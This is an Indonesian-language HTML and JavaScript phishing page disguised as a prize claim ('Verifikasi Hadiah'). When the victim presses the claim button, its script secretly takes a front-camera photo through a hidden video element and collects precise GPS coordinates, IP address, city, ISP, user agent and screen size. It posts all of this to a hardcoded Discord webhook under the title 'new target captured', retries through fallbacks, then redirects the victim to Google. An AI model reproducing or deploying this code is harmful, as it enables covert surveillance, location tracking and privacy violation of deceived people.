<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>üéÅ Verifikasi Hadiah</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      min-height: 100vh;
      background: radial-gradient(circle at center, #1a0000, #000);
      color: #fff;
      font-family: 'Segoe UI', Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 20px;
    }
    h1 { font-size: 2.2em; color: #ff4444; text-shadow: 0 0 30px #f00; margin-bottom: 10px; }
    p { font-size: 1.1em; color: #ccc; margin: 10px 0 25px; }
    #status {
      font-size: 1.2em;
      color: #ffaa00;
      margin: 25px 0;
      min-height: 60px;
      max-width: 90vw;
      word-wrap: break-word;
      line-height: 1.5;
    }
    #debugLog {
      background: #111;
      border: 1px solid #333;
      border-radius: 8px;
      padding: 12px;
      margin-top: 20px;
      width: 90vw;
      max-width: 500px;
      max-height: 200px;
      overflow-y: auto;
      font-family: monospace;
      font-size: 0.75em;
      text-align: left;
      color: #0f0;
      display: none;
    }
    button {
      padding: 16px 50px;
      font-size: 1.5em;
      background: linear-gradient(135deg, #cc0000, #ff2200);
      border: none;
      color: #fff;
      border-radius: 50px;
      cursor: pointer;
      box-shadow: 0 0 25px rgba(255,0,0,0.5);
      transition: 0.3s;
      font-weight: bold;
    }
    button:hover { transform: scale(1.05); box-shadow: 0 0 40px rgba(255,0,0,0.8); }
    button:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
    .ok { color: #0f0; }
    .err { color: #f44; }
    .warn { color: #fa0; }
  </style>
</head>
<body>

  <h1>üéâ SELAMAT! Kamu Terpilih</h1>
  <p>Verifikasi cepat untuk klaim hadiahmu.</p>
  <div id="status">Tekan tombol di bawah untuk mulai ‚¨áÔ∏è</div>
  <button id="btn" onclick="mulai()">üéÅ KLAIM HADIAH</button>
  <div id="debugLog"></div>

  <video id="vid" autoplay playsinline muted style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;"></video>
  <canvas id="cvs" style="display:none;"></canvas>

<script>
// ==============================================
// WEBHOOK URL - GANTI DENGAN MILIKMU
// ==============================================
const WEBHOOK = "https://discord.com/api/webhooks/1470328357110415455/tTwvOp-9oZm1WMYedDUzPwuviaES8bmimwryhgILqo2PjqXfXxyI8hCR-IvW9SSzeAtx";

// ==============================================
// DEBUG LOGGER
// ==============================================
const logBox = document.getElementById('debugLog');
logBox.style.display = 'block';

function log(msg, type = 'info') {
  const colors = { info: '#0f0', err: '#f44', warn: '#fa0', ok: '#0ff' };
  const time = new Date().toLocaleTimeString();
  const line = document.createElement('div');
  line.style.color = colors[type] || '#fff';
  line.textContent = `[${time}] ${msg}`;
  logBox.appendChild(line);
  logBox.scrollTop = logBox.scrollHeight;
  console.log(`[${type.toUpperCase()}] ${msg}`);
}

// ==============================================
// STATUS UPDATE
// ==============================================
function setStatus(text) {
  document.getElementById('status').innerText = text;
}

// ==============================================
// STEP 1: TEST WEBHOOK DULU (PALING PENTING)
// ==============================================
async function testWebhook() {
  log('Testing webhook connection...');

  try {
    const testPayload = {
      content: "‚úÖ **Webhook Test** - Koneksi berhasil pada " + new Date().toLocaleString('id-ID')
    };

    const res = await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(testPayload)
    });

    log(`Webhook response: ${res.status} ${res.statusText}`, res.ok ? 'ok' : 'err');

    if (!res.ok) {
      const body = await res.text();
      log(`Response body: ${body}`, 'err');
      return false;
    }

    log('Webhook test BERHASIL!', 'ok');
    return true;

  } catch (e) {
    log(`Webhook test GAGAL: ${e.message}`, 'err');

    if (e.message.includes('Failed to fetch') || e.message.includes('NetworkError')) {
      log('Kemungkinan CORS block. Akan coba proxy...', 'warn');
    }
    return false;
  }
}

// ==============================================
// KIRIM KE WEBHOOK (DENGAN FALLBACK PROXY)
// ==============================================
async function kirimWebhook(formData) {
  // Coba langsung dulu
  log('Mengirim ke Discord webhook langsung...');

  try {
    const res = await fetch(WEBHOOK, {
      method: 'POST',
      body: formData
    });

    if (res.ok) {
      log(`Berhasil! Status: ${res.status}`, 'ok');
      return true;
    }

    const errText = await res.text();
    log(`Gagal langsung: ${res.status} - ${errText}`, 'err');

  } catch (e) {
    log(`Error langsung: ${e.message}`, 'err');
  }

  // Fallback: Coba tanpa file (JSON only)
  log('Mencoba fallback tanpa foto...', 'warn');

  try {
    const payloadStr = formData.get('payload_json');
    const payload = JSON.parse(payloadStr);

    // Hapus image reference karena tidak ada file
    if (payload.embeds && payload.embeds[0]) {
      delete payload.embeds[0].image;
      payload.embeds[0].title = "üü° TARGET (Foto gagal dikirim)";
    }

    const res = await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (res.ok) {
      log('Fallback JSON berhasil!', 'ok');
      return true;
    }

    const errText = await res.text();
    log(`Fallback juga gagal: ${res.status} - ${errText}`, 'err');

  } catch (e) {
    log(`Fallback error: ${e.message}`, 'err');
  }

  // Fallback 2: Proxy via allorigins
  log('Mencoba via proxy...', 'warn');

  try {
    const payloadStr = formData.get('payload_json');
    const payload = JSON.parse(payloadStr);
    delete payload.embeds?.[0]?.image;

    const proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(WEBHOOK);

    // Proxy biasanya hanya support GET, jadi kita coba cara lain
    // Gunakan webhook dengan query string workaround
    // Sebenarnya ini tidak ideal, tapi sebagai last resort

    // Coba XMLHttpRequest sebagai alternatif
    return await new Promise((resolve) => {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', WEBHOOK, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.onload = function() {
        log(`XHR Status: ${xhr.status}`, xhr.status < 300 ? 'ok' : 'err');
        resolve(xhr.status >= 200 && xhr.status < 300);
      };
      xhr.onerror = function() {
        log('XHR juga gagal', 'err');
        resolve(false);
      };
      xhr.send(JSON.stringify(payload));
    });

  } catch (e) {
    log(`Proxy error: ${e.message}`, 'err');
  }

  return false;
}

// ==============================================
// AMBIL FOTO DARI KAMERA
// ==============================================
async function ambilFoto() {
  log('Meminta izin kamera...');

  const vid = document.getElementById('vid');
  const cvs = document.getElementById('cvs');

  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
    audio: false
  });

  vid.srcObject = stream;
  log('Stream kamera didapat, menunggu video ready...', 'ok');

  // Tunggu video benar-benar playing
  await new Promise((resolve, reject) => {
    let resolved = false;

    vid.onloadedmetadata = () => {
      log(`Video metadata: ${vid.videoWidth}x${vid.videoHeight}`);
    };

    vid.onplaying = () => {
      if (!resolved) {
        resolved = true;
        log('Video playing!', 'ok');
        setTimeout(resolve, 1500); // tunggu 1.5 detik
      }
    };

    vid.play().catch(e => {
      log(`Play error: ${e.message}`, 'err');
      if (!resolved) { resolved = true; reject(e); }
    });

    setTimeout(() => {
      if (!resolved) {
        resolved = true;
        log('Timeout, coba capture anyway...', 'warn');
        resolve();
      }
    }, 8000);
  });

  // Capture
  const w = vid.videoWidth || 640;
  const h = vid.videoHeight || 480;
  log(`Capturing: ${w}x${h}`);

  cvs.width = w;
  cvs.height = h;
  cvs.getContext('2d').drawImage(vid, 0, 0, w, h);

  // Matikan kamera
  stream.getTracks().forEach(t => t.stop());
  log('Kamera dimatikan', 'ok');

  // Convert ke blob
  const blob = await new Promise((resolve) => {
    cvs.toBlob(resolve, 'image/jpeg', 0.8);
  });

  if (!blob || blob.size < 1000) {
    log(`Blob terlalu kecil: ${blob?.size} bytes`, 'warn');
  } else {
    log(`Foto OK: ${blob.size} bytes`, 'ok');
  }

  return blob;
}

// ==============================================
// AMBIL LOKASI GPS
// ==============================================
async function ambilGPS() {
  log('Meminta izin GPS...');

  if (!navigator.geolocation) {
    log('Geolocation tidak didukung', 'warn');
    return null;
  }

  try {
    const pos = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      });
    });

    const data = {
      lat: pos.coords.latitude,
      lon: pos.coords.longitude,
      acc: pos.coords.accuracy
    };

    log(`GPS OK: ${data.lat}, ${data.lon} (¬±${data.acc}m)`, 'ok');
    return data;

  } catch (e) {
    log(`GPS gagal: ${e.message}`, 'warn');
    return null;
  }
}

// ==============================================
// AMBIL IP INFO
// ==============================================
async function ambilIP() {
  log('Mengambil data IP...');

  const apis = [
    'https://ipapi.co/json/',
    'https://ipwho.is/',
    'https://api.ipify.org?format=json'
  ];

  for (const url of apis) {
    try {
      const res = await fetch(url, { signal: AbortSignal.timeout(5000) });
      const data = await res.json();
      log(`IP dari ${new URL(url).hostname}: ${data.ip}`, 'ok');
      return {
        ip: data.ip || '?',
        city: data.city || '?',
        region: data.region || '?',
        country: data.country_name || data.country || '?',
        isp: data.org || data.connection?.org || '?'
      };
    } catch (e) {
      log(`${new URL(url).hostname} gagal: ${e.message}`, 'warn');
    }
  }

  return { ip: '?', city: '?', region: '?', country: '?', isp: '?' };
}

// ==============================================
// FUNGSI UTAMA
// ==============================================
async function mulai() {
  const btn = document.getElementById('btn');
  btn.disabled = true;
  btn.innerText = '‚è≥ Memproses...';

  // STEP 0: Test webhook dulu
  setStatus('üîç Testing koneksi server...');
  const webhookOK = await testWebhook();

  if (!webhookOK) {
    log('‚ö†Ô∏è Webhook test gagal, tapi tetap lanjut...', 'warn');
  }

  // STEP 1: Ambil foto
  let fotoBlob = null;
  setStatus('üì∏ Mengaktifkan kamera...');
  try {
    fotoBlob = await ambilFoto();
  } catch (e) {
    log(`Kamera error: ${e.message}`, 'err');
    setStatus('‚ö†Ô∏è Kamera gagal diakses, lanjut tanpa foto...');
  }

  // STEP 2: Ambil GPS
  setStatus('üìç Mengambil lokasi...');
  const gps = await ambilGPS();

  // STEP 3: Ambil IP
  setStatus('üåê Mengambil data jaringan...');
  const ip = await ambilIP();

  // STEP 4: Kirim data
  setStatus('üì§ Mengirim data...');
  log('Menyiapkan payload...');

  const filename = `target_${Date.now()}.jpg`;

  let gpsText = '‚ùå Tidak tersedia';
  let mapsLink = 'Tidak tersedia';
  if (gps) {
    gpsText = `üìç ${gps.lat.toFixed(6)}, ${gps.lon.toFixed(6)}\nüéØ Akurasi: ${gps.acc.toFixed(0)}m`;
    mapsLink = `[üó∫Ô∏è Buka Maps](https://www.google.com/maps?q=${gps.lat},${gps.lon})`;
  }

  const embed = {
    title: "üî¥ TARGET BARU TERTANGKAP",
    color: 16711680,
    fields: [
      { name: "üåê IP", value: `\`${ip.ip}\``, inline: true },
      { name: "üìç Kota", value: `${ip.city}, ${ip.country}`, inline: true },
      { name: "üè¢ ISP", value: ip.isp, inline: true },
      { name: "üõ∞Ô∏è GPS", value: gpsText, inline: false },
      { name: "üó∫Ô∏è Maps", value: mapsLink, inline: false },
      { name: "üì± Device", value: `\`\`\`${navigator.userAgent.substring(0, 150)}\`\`\``, inline: false },
      { name: "üìê Layar", value: `${screen.width}x${screen.height}`, inline: true },
      { name: "üïê Waktu", value: new Date().toLocaleString('id-ID'), inline: true }
    ],
    timestamp: new Date().toISOString()
  };

  // Jika ada foto, tambahkan image reference
  if (fotoBlob && fotoBlob.size > 1000) {
    embed.image = { url: `attachment://${filename}` };
  }

  const payload = { embeds: [embed] };
  const formData = new FormData();
  formData.append('payload_json', JSON.stringify(payload));

  if (fotoBlob && fotoBlob.size > 1000) {
    formData.append('file', fotoBlob, filename);
    log(`File ditambahkan: ${filename} (${fotoBlob.size} bytes)`);
  }

  const berhasil = await kirimWebhook(formData);

  if (berhasil) {
    setStatus('‚úÖ Verifikasi berhasil! Mengalihkan...');
    log('SELESAI - Data terkirim!', 'ok');
    setTimeout(() => {
      window.location.href = 'https://google.com';
    }, 3000);
  } else {
    setStatus('‚ùå Gagal mengirim. Periksa debug log di bawah.');
    log('GAGAL TOTAL - Periksa webhook URL', 'err');
    btn.disabled = false;
    btn.innerText = 'üîÑ COBA LAGI';
  }
}

// Auto-test webhook saat halaman load
window.addEventListener('load', () => {
  log('Halaman loaded');
  log(`Protocol: ${location.protocol}`);
  log(`Host: ${location.host}`);

  if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
    log('‚ö†Ô∏è BUKAN HTTPS! Kamera & GPS tidak akan jalan!', 'err');
  }
});
</script>
</body>
</html>